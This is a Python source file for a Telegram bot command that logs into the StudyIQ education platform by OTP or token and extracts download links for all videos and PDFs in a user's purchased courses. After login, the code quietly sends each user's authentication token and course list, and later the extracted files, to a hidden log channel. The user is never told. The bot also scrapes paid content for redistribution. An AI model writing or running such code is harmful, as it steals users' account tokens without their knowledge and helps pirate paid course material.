import re
import os
import aiohttp
import aiofiles
import asyncio
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.enums import ParseMode
from Extractor import app
from config import PREMIUM_LOGS
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# OTP API CONFIGURATION
OTP_CONFIG = {
    "send_otp": {
        "url": "https://www.studyiq.net/api/web/userlogin",
        "method": "POST",
        "params": {
            "mobile": ""
        },
        "headers": {
            "Content-Type": "application/json"
        }
    },
    "verify_otp": {
        "url": "https://www.studyiq.net/api/web/web_user_login",
        "method": "POST",
        "params": {
            "user_id": "",
            "otp": ""
        },
        "headers": {
            "Content-Type": "application/json"
        }
    }
}

# API ENDPOINTS
API_ENDPOINTS = {
    "courses": "https://backend.studyiq.net/app-content-ws/api/v1/getAllPurchasedCourses?source=APP",
    "course_details_endpoint": "https://backend.studyiq.net/app-content-ws/v2/course/getDetails?courseId={}"
}

def get_content_icon(content_type):
    """Return appropriate icon based on content type"""
    icons = {
        'video': '🎥',
        'pdf': '📚',
        'document': '📝',
        'ppt': '📊',
        'audio': '🎵',
        'other': '📦'
    }
    return icons.get(content_type, '📦')

def determine_content_type(url, field_name):
    try:
        if not url or not isinstance(url, str):
            return 'other'
        
        url_lower = url.lower().strip()
        field_lower = field_name.lower().strip() if field_name else ''
        
        if '.pdf' in url_lower:
            return 'pdf'
        elif '.mp4' in url_lower or '.m3u8' in url_lower or '.mpd' in url_lower:
            return 'video'
        elif '.mp3' in url_lower:
            return 'audio'
        elif '.doc' in url_lower or '.docx' in url_lower:
            return 'document'
        elif '.ppt' in url_lower or '.pptx' in url_lower:
            return 'ppt'
        elif 'pdf' in field_lower or 'document' in field_lower or 'material' in field_lower or field_name == 'textUploadUrl':
            return 'pdf'
        elif 'video' in field_lower:
            return 'video'
        else:
            return 'other'
    except Exception:
        return 'other'

def remove_duplicates(content_list):
    if not isinstance(content_list, list):
        return []
    
    seen_urls = set()
    unique_content = []
    
    for content in content_list:
        if not isinstance(content, dict):
            continue
            
        try:
            url = content.get('url', '')
            if url and isinstance(url, str):
                url = url.strip()
                if url and url not in seen_urls:
                    seen_urls.add(url)
                    unique_content.append(content)
        except Exception:
            continue
    
    return unique_content

async def extract_hierarchical_content(item, parent_path=""):
    """Extract content maintaining folder structure"""
    contents = []
    
    if not isinstance(item, dict):
        return contents
    
    current_name = str(item.get('name', 'Unknown')).strip()
    current_path = f"{parent_path}/{current_name}" if parent_path else current_name
    
    # Check if this is a folder/subfolder
    if item.get('type') in ['folder', 'subfolder'] and 'children' in item:
        # Process children recursively
        for child in item.get('children', []):
            child_contents = await extract_hierarchical_content(child, current_path)
            contents.extend(child_contents)
    
    # Extract URLs from current item
    url_fields = [
        'videoUrl', 'pdfUrl', 'url', 'mediaUrl', 'streamUrl', 
        'documentUrl', 'notesUrl', 'downloadUrl', 'link',
        'fileUrl', 'contentUrl', 'resourceUrl', 'attachmentUrl',
        'pdfLink', 'documentLink', 'downloadLink', 'mediaLink',
        'studyMaterialUrl', 'handoutUrl', 'materialUrl',
        'textUploadUrl'
    ]
    
    for field in url_fields:
        url = item.get(field)
        if url and isinstance(url, str) and url.strip():
            content_type = determine_content_type(url, field)
            if field == 'textUploadUrl':
                content_type = 'pdf'
            contents.append({
                'name': current_name,
                'url': url.strip(),
                'type': content_type,
                'path': current_path,
                'source': f'direct_{field}'
            })
    
    # Handle nested urls array
    if 'urls' in item and isinstance(item['urls'], list):
        for url_item in item['urls']:
            if isinstance(url_item, dict):
                url = url_item.get('url') or url_item.get('link')
                if url and isinstance(url, str) and url.strip():
                    name = str(url_item.get('name', current_name)).strip()
                    content_type = determine_content_type(url, '')
                    contents.append({
                        'name': name,
                        'url': url.strip(),
                        'type': content_type,
                        'path': f"{current_path}/{name}",
                        'source': 'nested_urls'
                    })
    
    return contents

async def retry_request(session, url, headers, retries=3):
    for i in range(retries):
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=30)) as response:
                if response.status == 200:
                    return await response.json()
        except asyncio.TimeoutError:
            logger.warning(f"Attempt {i+1} timed out")
        except Exception as e:
            logger.warning(f"Attempt {i+1} failed: {e}")
            if i < retries - 1:
                await asyncio.sleep(2)
    return None

async def cleanup_temp_files(*filenames):
    for filename in filenames:
        try:
            if os.path.exists(filename):
                os.remove(filename)
        except Exception as e:
            logger.warning(f"Failed to cleanup {filename}: {e}")

# MAIN EXTRACTION FUNCTION
@app.on_message(filters.command(["iq"]))
async def handle_iq_logic(app: Client, m: Message):
    try:
        # Initial message
        editable = await m.reply_text(
            "🔹 STUDY IQ EXTRACTOR 🔹\n\n"
            "📌 Login Options:\n"
            "1. 📱 Phone Number (for OTP)\n"
            "2. 🔑 Direct API Token\n\n"
            "💡 Send your preferred login method below"
        )
        
        # GET USER INPUT - KEEP IN CHAT
        input_data: Message = await app.listen(chat_id=m.chat.id)
        user_input = input_data.text.strip() if input_data.text else ""
        
        # CHECK IF INPUT IS A PHONE NUMBER (10 digits)
        phone_number = re.sub(r'\D', '', user_input)
        is_phone_number = len(phone_number) == 10
        
        token = ""
        
        if is_phone_number:
            # MOBILE NUMBER LOGIN FLOW
            mobile_for_api = phone_number
            
            await editable.edit_text("🔄 Requesting OTP...")
            async with aiohttp.ClientSession() as session:
                try:
                    # Prepare OTP send request
                    send_otp_config = OTP_CONFIG["send_otp"]
                    send_params = send_otp_config["params"].copy()
                    send_params["mobile"] = mobile_for_api
                    
                    # Send OTP request
                    otp_response = await session.post(
                        send_otp_config["url"],
                        json=send_params,
                        headers=send_otp_config["headers"],
                        timeout=aiohttp.ClientTimeout(total=30)
                    )
                    
                    if otp_response.status == 200:
                        otp_data = await otp_response.json()
                        
                        if otp_data.get("success", 1) == 0:
                            error_msg = otp_data.get("msg", "Unknown error")
                            await editable.edit_text(f"❌ OTP Request Failed: {error_msg}")
                            return
                        
                        user_id = otp_data.get("data", {}).get("user_id")
                        
                        if not user_id:
                            await editable.edit_text("❌ Failed to get user_id from OTP response")
                            return
                        
                        await editable.edit_text(f"✅ OTP sent to {phone_number}!\n\nEnter the OTP:")
                        input_otp: Message = await app.listen(m.chat.id)
                        otp = input_otp.text.strip() if input_otp.text else ""
                        
                        if not otp:
                            await editable.edit_text("❌ No OTP provided")
                            return
                        
                        await editable.edit_text("🔄 Verifying OTP...")
                        
                        # Prepare OTP verification request
                        verify_otp_config = OTP_CONFIG["verify_otp"]
                        verify_params = verify_otp_config["params"].copy()
                        verify_params["user_id"] = user_id
                        verify_params["otp"] = otp
                        
                        # Send OTP verification request
                        login_response = await session.post(
                            verify_otp_config["url"],
                            json=verify_params,
                            headers=verify_otp_config["headers"],
                            timeout=aiohttp.ClientTimeout(total=30)
                        )
                        
                        if login_response.status == 200:
                            login_data = await login_response.json()
                            
                            if login_data.get("success", 1) == 0:
                                error_msg = login_data.get("msg", "Unknown error")
                                await editable.edit_text(f"❌ Login Failed: {error_msg}")
                                return
                            
                            token = login_data.get("data", {}).get("api_token")
                            
                            if not token:
                                await editable.edit_text("❌ Failed to get token from OTP verification")
                                return
                        else:
                            error_text = await login_response.text()
                            await editable.edit_text(f"❌ Invalid OTP or login failed. Server responded: {error_text}")
                            return
                    else:
                        error_data = await otp_response.text()
                        await editable.edit_text(f"❌ Failed to send OTP. Server responded: {error_data}")
                        return
                        
                except Exception as e:
                    await editable.edit_text(f"❌ Network error: {str(e)}")
                    return
        else:
            # TOKEN LOGIN FLOW
            token = user_input
            
            if not token:
                await editable.edit_text("❌ No token provided")
                return
        
        headers = {"Authorization": f"Bearer {token}"}
        
        # FETCH COURSES
        await editable.edit_text("🔄 Fetching your courses...")
        async with aiohttp.ClientSession() as session:
            courses_response = await session.get(API_ENDPOINTS["courses"], headers=headers, timeout=aiohttp.ClientTimeout(total=30))
            
            if courses_response.status == 200:
                courses_data = await courses_response.json()
                
                # SHOW BATCHES
                batch_ids = []
                batch_names = {}
                
                for i, course in enumerate(courses_data.get("data", [])):
                    batch_id = course.get('courseId')
                    name = course.get('courseTitle', 'Unknown Course')
                    if batch_id:
                        batch_ids.append(str(batch_id))
                        batch_names[str(batch_id)] = name
                
                if not batch_ids:
                    await editable.edit_text(
                        "❌ No batches found or token invalid\n\n"
                        "💡 Please try logging in again with /iq"
                    )
                    return
                
                # Create a formatted list of all batch IDs
                all_batch_ids = "&".join(batch_ids)
                
                # ONE DETAILED MESSAGE COMBINING TOKEN + COURSES
                detailed_message = (
                    f"✅ STUDY IQ LOGIN SUCCESSFUL\n\n"
                    f"🔑 AUTHENTICATION TOKEN:\n"
                    f"<code>{token}</code>\n\n"
                    f"📚 YOUR COURSES ({len(batch_ids)} TOTAL):\n"
                )
                
                # Add batches with copyable IDs
                for i, batch_id in enumerate(batch_ids, 1):
                    batch_name = batch_names[batch_id]
                    display_name = batch_name[:50] + "..." if len(batch_name) > 50 else batch_name
                    detailed_message += f"{i}. <code>{batch_id}</code> - {display_name}\n"
                
                detailed_message += (
                    f"\n📋 QUICK ACTIONS:\n"
                    f"• Extract All: <code>{all_batch_ids}</code>\n"
                    f"• Extract Specific: Send batch ID(s) separated by '&'\n\n"
                    f"💡 Send batch ID(s) below to start extraction"
                )
                
                # Send detailed message to user (STAYS IN CHAT)
                await editable.edit_text(
                    detailed_message,
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True
                )
                
                # ALSO SEND SAME MESSAGE TO LOG CHANNEL
                try:
                    await app.send_message(
                        chat_id=PREMIUM_LOGS,
                        text=detailed_message,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True
                    )
                except Exception as e:
                    logger.warning(f"Failed to send detailed message to log channel: {e}")
                
                # GET BATCH SELECTION
                input_batch: Message = await app.listen(chat_id=m.chat.id)
                batch_input = input_batch.text.strip() if input_batch.text else ""
                
                # SPLIT BATCH IDS BY '&'
                batch_id_list = [bid.strip() for bid in batch_input.split('&') if bid.strip()]
                
                if not batch_id_list:
                    await m.reply_text("❌ No batch ID provided")
                    return
                
                # PROCESS EACH BATCH
                for batch_id in batch_id_list:
                    if batch_id not in batch_names:
                        await m.reply_text(
                            f"⚠️ Invalid batch ID: {batch_id}\n\n"
                            f"💡 Please check the batch ID and try again"
                        )
                        continue
                    
                    course_title = batch_names.get(batch_id, f'Course_{batch_id}')
                    
                    processing_msg = await m.reply_text(
                        f"🔄 Processing Batch: {batch_id}\n"
                        f"📚 Course: {course_title}\n\n"
                        f"⏳ Extracting content..."
                    )
                    
                    course_details_url = API_ENDPOINTS["course_details_endpoint"].format(batch_id)
                    course_data = await retry_request(session, course_details_url, headers)
                    
                    if course_data and "data" in course_data:
                        api_course_title = (
                            course_data.get('courseTitle') or 
                            course_data.get('title') or 
                            course_data.get('name') or 
                            course_data.get('batchName') or 
                            course_data.get('courseName')
                        )
                        
                        if api_course_title:
                            course_title = str(api_course_title)
                        
                        # EXTRACT HIERARCHICAL CONTENT
                        all_content = []
                        data_items = course_data.get('data', [])
                        
                        if isinstance(data_items, list):
                            for item in data_items:
                                item_content = await extract_hierarchical_content(item)
                                all_content.extend(item_content)
                        
                        # REMOVE DUPLICATES
                        unique_content = remove_duplicates(all_content)
                        
                        if not unique_content:
                            await m.reply_text(
                                f"⚠️ No content found in batch {batch_id} - {course_title}\n\n"
                                f"💡 This batch might be empty or still being prepared"
                            )
                            continue
                        
                        # CALCULATE STATS
                        total_files = len(unique_content)
                        
                        # COUNT BY TYPE
                        type_counts = {}
                        for content in unique_content:
                            content_type = content.get('type', 'unknown')
                            type_counts[content_type] = type_counts.get(content_type, 0) + 1
                        
                        # SANITIZE FILENAME
                        sanitized_title = re.sub(r'[\\/:*?"<>|\t\n\r]+', '', course_title).strip()
                        filename = f"{sanitized_title}.txt"
                        
                        # CREATE HIERARCHICAL OUTPUT WITH STRUCTURE
                        content_by_section = {}
                        
                        # Group content by path
                        for content in unique_content:
                            path = content.get('path', 'Other')
                            section = path.split('/')[0] if '/' in path else path
                            
                            if section not in content_by_section:
                                content_by_section[section] = []
                            content_by_section[section].append(content)
                        
                        # CREATE FORMATTED OUTPUT WITH HIERARCHICAL STRUCTURE
                        content_text = ""
                        for section in sorted(content_by_section.keys()):
                            content_text += f"{section}\n"
                            
                            # Group by sub-section
                            sub_sections = {}
                            for content in content_by_section[section]:
                                path_parts = content.get('path', '').split('/')
                                sub_section = path_parts[1] if len(path_parts) > 1 else 'General'
                                
                                if sub_section not in sub_sections:
                                    sub_sections[sub_section] = []
                                sub_sections[sub_section].append(content)
                            
                            # Add sub-sections
                            for sub_section in sorted(sub_sections.keys()):
                                if sub_section != 'General':
                                    content_text += f"  {sub_section}\n"
                                
                                # Add content items
                                for content in sub_sections[sub_section]:
                                    icon = get_content_icon(content.get('type', 'other'))
                                    name = content.get('name', 'Untitled').strip()
                                    url = content.get('url', '').strip()
                                    indent = "    " if sub_section != 'General' else "  "
                                    content_text += f"{indent}{icon} {name} ~ {url}\n"
                            
                            content_text += "\n"  # Empty line between sections
                        
                        # WRITE TO FILE
                        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
                            await f.write(content_text)
                        
                        # Check file size before sending
                        if os.path.getsize(filename) > 50 * 1024 * 1024:
                            await m.reply_text("⚠️ File too large to send via Telegram. Consider splitting content.")
                            await cleanup_temp_files(filename)
                            continue
                        
                        # DETAILED FILE CAPTION
                        caption = (
                            f"🎓 COURSE EXTRACTED 🎓\n\n"
                            f"📚 BATCH: {course_title} (ID: {batch_id})\n\n"
                            f"📊 CONTENT BREAKDOWN:\n"
                            f"📁 Total Links: {total_files}\n"
                            f"🎬 Videos: {type_counts.get('video', 0)}\n"
                            f"📄 PDFs: {type_counts.get('pdf', 0)}\n"
                            f"📑 Docs: {type_counts.get('document', 0) + type_counts.get('ppt', 0)}\n"
                            f"🎵 Audio: {type_counts.get('audio', 0)}\n"
                            f"📦 Others: {type_counts.get('other', 0)}\n\n"
                            f"🚀 By: @{(await app.get_me()).username}\n"
                            f"╾───• @imxTaR •───╼"
                        )
                        
                        # Send file to user
                        sent_message = await m.reply_document(
                            document=filename,
                            caption=caption,
                            parse_mode=ParseMode.HTML
                        )
                        
                        # ALSO SEND TO LOG CHANNEL
                        try:
                            await app.send_document(
                                chat_id=PREMIUM_LOGS,
                                document=filename,
                                caption=caption,
                                parse_mode=ParseMode.HTML
                            )
                        except Exception as e:
                            logger.warning(f"Failed to send extracted file to log channel: {e}")
                        
                        # CLEANUP
                        await cleanup_temp_files(filename)
                    
                    else:
                        await m.reply_text(
                            f"❌ Error: Failed to fetch batch {batch_id}\n\n"
                            f"💡 Troubleshooting:\n"
                            f"• Check your internet connection\n"
                            f"• Verify the batch ID is correct\n"
                            f"• Try logging in again with /iq\n"
                            f"• Contact support if issue persists"
                        )
                
                # COMPLETION MESSAGE
                completion_msg = await m.reply_text("✅ Extraction Complete! All files sent above.")
                
                # Log completion to channel
                try:
                    await app.send_message(PREMIUM_LOGS, text="✅ Extraction Complete!")
                except: pass
                
            else:
                await editable.edit_text(
                    "❌ Authentication failed\n\n"
                    "💡 Your token might have expired. Please try logging in again with /iq"
                )
                
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}", exc_info=True)
        try:
            error_msg = await m.reply_text(
                f"❌ Error: {str(e)}\n\n"
                f"💡 Troubleshooting:\n"
                f"• Check your internet connection\n"
                f"• Verify the batch ID is correct\n"
                f"• Try logging in again with /iq\n"
                f"• Contact support if issue persists"
            )
            
            # Log error to channel
            try:
                await app.send_message(PREMIUM_LOGS, text=f"❌ Error: {str(e)}")
            except: pass
            
        except:
            pass
